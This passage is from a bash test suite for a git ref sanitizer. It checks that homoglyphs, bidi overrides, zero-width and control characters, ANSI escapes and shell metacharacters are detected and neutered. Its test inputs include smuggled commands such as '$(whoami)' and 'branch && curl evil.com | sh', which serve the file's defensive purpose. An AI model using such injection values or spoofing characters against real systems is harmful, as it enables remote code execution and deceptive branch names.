# 21.4 Cyrillic 'c' (U+0441, D1 81) vs Latin 'c'
test_detect "$(printf '\xd1\x81ode-review')" \
  "Homoglyph: Cyrillic c in 'code'" "found"

# 21.5 Greek omicron (U+03BF, CE BF) vs Latin 'o'
test_detect "$(printf 'pr\xce\xbfduction')" \
  "Homoglyph: Greek omicron in 'production'" "found"

# 21.6 Full-width Latin 'A' (U+FF21, EF BC A1) -- looks like ASCII A
test_detect "$(printf '\xef\xbc\xa1dmin')" \
  "Homoglyph: fullwidth A in 'Admin'" "found"

# 21.7 Latin Small Letter Dotless I (U+0131, C4 B1)
test_detect "$(printf 'adm\xc4\xb1n')" \
  "Homoglyph: dotless i in 'admin'" "found"

# 21.8 Mixed script: Latin + Cyrillic in same word
test_detect "$(printf 'p\xd0\xb0\xd1\x81\xd1\x81word')" \
  "Homoglyph: Cyrillic 'ass' in password" "found"

# 21.9 Combining diacritical marks (U+0300-036F) -- modifies preceding char
test_detect "$(printf 'admin\xcc\x80')" \
  "Combining: grave accent on n" "found"

# 21.10 Combining long stroke overlay (U+0336) -- strikethrough attack
test_detect "$(printf 'safe\xcc\xb6branch')" \
  "Combining: strikethrough overlay" "found"

# =============================================================================
# 22. Git Ref-Specific Attack Patterns
# =============================================================================
echo "--- Section 22: Git Ref Attack Patterns ---"
echo ""

# 22.1 Lock file bypass: refs/heads/branch.lock
# (This is printable ASCII so detect_hidden_chars won't flag it,
# but sanitize_ref replaces dots only in specific contexts)
test_detect "refs/heads/branch" \
  "Git ref: normal ref path" "clean"

# 22.2 ref with embedded null (truncation attack)
# Bash strips null, so this becomes "branchname" -- effectively clean
echo "Test $((pass + fail + skip + 1)): detect_hidden_chars -- Git ref: null truncation"
echo "  [SKIP] Bash strips null bytes (same as test 37)"
skip=$((skip + 1))
echo ""

# 22.3 ref with BOM before hash (PR #786 exact pattern)
test_detect "$(printf 'fix-bisect-\xef\xbb\xbf95ebc2f7')" \
  "Git ref: BOM before hash (PR#786)" "found"

# 22.4 ref with zero-width space between path components
test_detect "$(printf 'refs/\xe2\x80\x8bheads/evil')" \
  "Git ref: ZWSP in path" "found"

# 22.5 Tag name with homoglyph
test_detect "$(printf 'v2.3.\xd0\xb0')" \
  "Git ref: Cyrillic a in tag version" "found"

# 22.6 refs/tags with bidi override to mask tag name
test_detect "$(printf 'refs/tags/\xe2\x80\xaemalicious_tag')" \
  "Git ref: bidi in tag path" "found"

# 22.7 ref ending with control char
test_detect "$(printf 'feature/branch\x01')" \
  "Git ref: trailing SOH" "found"

# 22.8 ref with consecutive hidden chars (amplification)
test_detect "$(printf 'a\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8bb')" \
  "Git ref: 5x ZWSP amplification" "found"

# =============================================================================
# 23. C1 Control Characters (0x80-0x9F via UTF-8: C2 80 - C2 9F)
# =============================================================================
echo "--- Section 23: C1 Control Characters (U+0080-009F) ---"
echo ""

# C1 control characters are the Unicode equivalent of C0 controls, encoded
# as 2-byte UTF-8 sequences C2 80 through C2 9F. They are used in legacy
# terminal protocols and should be flagged.

# 23.1 PAD (U+0080, C2 80) -- padding character
test_detect "$(printf 'test\xc2\x80value')" \
  "C1: PAD U+0080" "found"

# 23.2 BPH (U+0082, C2 82) -- break permitted here
test_detect "$(printf 'test\xc2\x82value')" \
  "C1: BPH U+0082" "found"

# 23.3 NEL (U+0085, C2 85) -- next line (newline smuggling)
test_detect "$(printf 'test\xc2\x85value')" \
  "C1: NEL U+0085 (newline smuggle)" "found"

# 23.4 SSA (U+0086, C2 86) -- start of selected area
test_detect "$(printf 'test\xc2\x86value')" \
  "C1: SSA U+0086" "found"

# 23.5 CSI (U+009B, C2 9B) -- ANSI CSI (alternative to ESC [)
test_detect "$(printf 'test\xc2\x9bvalue')" \
  "C1: CSI U+009B (ANSI alt)" "found"

# 23.6 OSC (U+009D, C2 9D) -- Operating System Command (alternative to ESC ])
test_detect "$(printf 'test\xc2\x9dvalue')" \
  "C1: OSC U+009D" "found"

# 23.7 ST (U+009C, C2 9C) -- String Terminator
test_detect "$(printf 'test\xc2\x9cvalue')" \
  "C1: ST U+009C" "found"

# 23.8 PM (U+009E, C2 9E) -- Privacy Message
test_detect "$(printf 'test\xc2\x9evalue')" \
  "C1: PM U+009E" "found"

# 23.9 APC (U+009F, C2 9F) -- Application Program Command
test_detect "$(printf 'test\xc2\x9fvalue')" \
  "C1: APC U+009F" "found"

# =============================================================================
# 24. Unicode Special Characters (Tags, Variation Selectors, Specials)
# =============================================================================
echo "--- Section 24: Unicode Special Characters ---"
echo ""

# 24.1 Object Replacement Character (U+FFFC, EF BF BC)
test_detect "$(printf 'test\xef\xbf\xbcvalue')" \
  "Special: ORC U+FFFC" "found"

# 24.2 Replacement Character (U+FFFD, EF BF BD)
test_detect "$(printf 'test\xef\xbf\xbdvalue')" \
  "Special: Replacement U+FFFD" "found"

# 24.3 Non-Character U+FFFE (EF BF BE) -- byte order mark's complement
test_detect "$(printf 'test\xef\xbf\xbevalue')" \
  "Special: non-char U+FFFE" "found"

# 24.4 Non-Character U+FFFF (EF BF BF)
test_detect "$(printf 'test\xef\xbf\xbfvalue')" \
  "Special: non-char U+FFFF" "found"

# 24.5 Soft Hyphen (U+00AD, C2 AD) -- invisible in many renderers
test_detect "$(printf 'ad\xc2\xadmin')" \
  "Special: soft hyphen U+00AD" "found"

# 24.6 Non-Breaking Space (U+00A0, C2 A0) -- looks like space but isn't
test_detect "$(printf 'branch\xc2\xa0name')" \
  "Special: NBSP U+00A0" "found"

# 24.7 Mongolian Vowel Separator (U+180E, E1 A0 8E) -- sometimes zero-width
test_detect "$(printf 'test\xe1\xa0\x8evalue')" \
  "Special: MVS U+180E" "found"

# 24.8 Ideographic Space (U+3000, E3 80 80) -- CJK fullwidth space
test_detect "$(printf 'test\xe3\x80\x80value')" \
  "Special: ideographic space U+3000" "found"

# 24.9 Variation Selector 1 (U+FE00, EF B8 80)
test_detect "$(printf 'test\xef\xb8\x80value')" \
  "Special: variation sel U+FE00" "found"

# 24.10 Zero Width No-Break Space at different positions
# Start
test_detect "$(printf '\xef\xbb\xbfstart')" \
  "BOM position: start" "found"
# Middle
test_detect "$(printf 'mid\xef\xbb\xbfdle')" \
  "BOM position: middle" "found"
# End
test_detect "$(printf 'end\xef\xbb\xbf')" \
  "BOM position: end" "found"

# =============================================================================
# 25. sanitize_ref Neutering of Attack Vectors
# =============================================================================
echo "--- Section 25: sanitize_ref Attack Neutering ---"
echo ""

# Verify sanitize_ref properly neutralizes each attack class

# 25.1 Tab neutered
test_ref_filter "$(printf 'branch\tname')" \
  "neuter: tab" "branch-name"

# 25.2 Bell neutered
test_ref_filter "$(printf 'branch\x07name')" \
  "neuter: bell" "branch-name"

# 25.3 Escape neutered
test_ref_filter "$(printf 'branch\x1bname')" \
  "neuter: escape" "branch-name"

# 25.4 ANSI sequence neutered to clean dashes
test_ref_filter "$(printf 'branch\x1b[31mred\x1b[0mname')" \
  "neuter: ANSI color" "branch-31mred-0mname"

# 25.5 C1 CSI neutered
test_ref_filter "$(printf 'branch\xc2\x9b32mgreen')" \
  "neuter: C1 CSI" "branch-32mgreen"

# 25.6 Soft hyphen neutered
test_ref_filter "$(printf 'ad\xc2\xadmin')" \
  "neuter: soft hyphen" "ad-min"

# 25.7 NBSP neutered
test_ref_filter "$(printf 'branch\xc2\xa0name')" \
  "neuter: NBSP" "branch-name"

# 25.8 Multiple different control chars collapse to single dash
test_ref_filter "$(printf 'a\x01\x02\x03b')" \
  "neuter: triple control -> single dash" "a-b"

# 25.9 Shell injection chars neutered
test_ref_filter '$(whoami)' \
  "neuter: dollar-paren cmd sub" "-whoami-"

# 25.10 Ampersand + pipe neutered
test_ref_filter 'branch && curl evil.com | sh' \
  "neuter: ampersand pipe chain" "branch-curl-evil.com-sh"

# 25.11 All printable ASCII passes through
test_ref_filter "ABCabc012._/-" \
  "neuter: printable passthrough" "ABCabc012._/-"

# 25.12 Homoglyph neutered to dashes
test_ref_filter "$(printf 'p\xd0\xb0ss\xd1\x81\xd0\xbede')" \
  "neuter: Cyrillic homoglyphs" "p-ss-de"

# =============================================================================
# 26. validate_ref Full Pipeline Attack Tests
# =============================================================================
echo "--- Section 26: validate_ref Full Pipeline ---"
echo ""

# validate_ref detects (stderr) + sanitizes (stdout)

# 26.1 ANSI escape: detected and neutered
test_validate_ref "$(printf 'branch\x1b[31mred')" \
  "pipeline: ANSI escape" "branch-31mred"

# 26.2 C1 control: detected and neutered
test_validate_ref "$(printf 'branch\xc2\x9bCSI')" \
  "pipeline: C1 CSI" "branch-CSI"

# 26.3 Tab + BOM combo: both detected and removed
test_validate_ref "$(printf '\x09\xef\xbb\xbfbranch')" \
  "pipeline: tab + BOM" "branch"

# 26.4 Full attack chain: BOM + bidi + ZWSP + homoglyph
test_validate_ref "$(printf '\xef\xbb\xbf\xe2\x80\xaeadm\xe2\x80\x8b\xd0\xb8n')" \
  "pipeline: full attack chain" "adm-n"

# 26.5 Soft hyphen in version tag
test_validate_ref "$(printf 'v2.3.\xc2\xad1')" \
  "pipeline: soft hyphen in tag" "v2.3.-1"

# 26.6 NBSP between words
test_validate_ref "$(printf 'feature\xc2\xa0branch')" \
  "pipeline: NBSP between words" "feature-branch"

# 26.7 Very long attack string with multiple classes
long_attack="$(printf 'start\xef\xbb\xbf')$(printf '\xe2\x80\x8b%.0s' $(seq 1 20))$(printf 'end')"
test_validate_ref "$long_attack" \
  "pipeline: long repeated ZWSP" "start-end"

# =============================================================================
# 27. Version Check
# =============================================================================
echo "--- Section 17: Version Check ---"
echo ""

echo "Test $((pass + fail + skip + 1)): sanitizer_version"
version="$(sanitizer_version)"
echo "  Version: $version"
if grep -qF "sanitizer-v4" <<< "$version"; then
  echo "  [PASS] Version is v4"
  pass=$((pass + 1))
else
  echo "  [FAIL] Expected v4, got: $version"
  fail=$((fail + 1))
fi
echo ""

# =============================================================================
# 18. Cross-Function Consistency
# =============================================================================
echo "--- Section 18: Cross-Function Consistency ---"
echo ""

# 18.1 detect finds what sanitize_ref would change
echo "Test $((pass + fail + skip + 1)): Cross: detect + sanitize_ref agree on BOM"
bom_input="$(printf '\xef\xbb\xbfbranch')"
detect_rc=0
detect_hidden_chars "$bom_input" "cross-test" 2>/dev/null || detect_rc=$?
ref_output="$(sanitize_ref "$bom_input")"
if [ "$detect_rc" -eq 0 ] && [ "$ref_output" = "branch" ]; then
  echo "  detect=found, sanitize_ref=branch"
  echo "  [PASS] Both agree BOM is removed"
  pass=$((pass + 1))
else
  echo "  detect_rc=$detect_rc, ref_output=$ref_output"
  echo "  [FAIL]"
  fail=$((fail + 1))
fi
echo ""

# 18.2 detect finds what sanitize_line would strip
echo "Test $((pass + fail + skip + 1)): Cross: detect + sanitize_line agree on ZWSP"
zwsp_input="$(printf 'is\xe2\x80\x8bAdmin')"
detect_rc=0
detect_hidden_chars "$zwsp_input" "cross-test" 2>/dev/null || detect_rc=$?
line_output="$(sanitize_line "$zwsp_input")"
if [ "$detect_rc" -eq 0 ] && [ "$line_output" = "isAdmin" ]; then
  echo "  detect=found, sanitize_line=isAdmin"
  echo "  [PASS] Both agree ZWSP is stripped"
  pass=$((pass + 1))
else
  echo "  detect_rc=$detect_rc, line_output=$line_output"
  echo "  [FAIL]"
  fail=$((fail + 1))
fi
echo ""

# 18.3 Clean input: detect returns clean, sanitize_ref is passthrough
echo "Test $((pass + fail + skip + 1)): Cross: clean input is passthrough"
clean_input="feature/my-branch"
detect_rc=0
detect_hidden_chars "$clean_input" "cross-test" 2>/dev/null || detect_rc=$?
ref_output="$(sanitize_ref "$clean_input")"
if [ "$detect_rc" -eq 1 ] && [ "$ref_output" = "$clean_input" ]; then
  echo "  detect=clean, sanitize_ref=passthrough"
  echo "  [PASS]"
  pass=$((pass + 1))
else
  echo "  detect_rc=$detect_rc, ref_output=$ref_output"
  echo "  [FAIL]"
  fail=$((fail + 1))
fi
echo ""

# =============================================================================
# 19. PCRE Availability Guard
# =============================================================================
echo "--- Section 19: PCRE Availability ---"
echo ""

echo "Test $((pass + fail + skip + 1)): grep -P available"
if echo "test" | LC_ALL=C grep -qP 'test' 2>/dev/null; then
  echo "  [PASS] grep -P (PCRE) is available"
  pass=$((pass + 1))
else
  echo "  [SKIP] grep -P not available (BSD grep?)"
  skip=$((skip + 1))
fi
echo ""

# =============================================================================
# Results Summary
# =============================================================================

echo "=========================================="
echo "Results: $pass passed, $fail failed, $skip skipped"
echo "=========================================="

if [ $fail -eq 0 ]; then
  echo "[OK] All tests PASSED"
  exit 0
else
  echo "[FAIL] Some tests FAILED"
  exit 1
fi
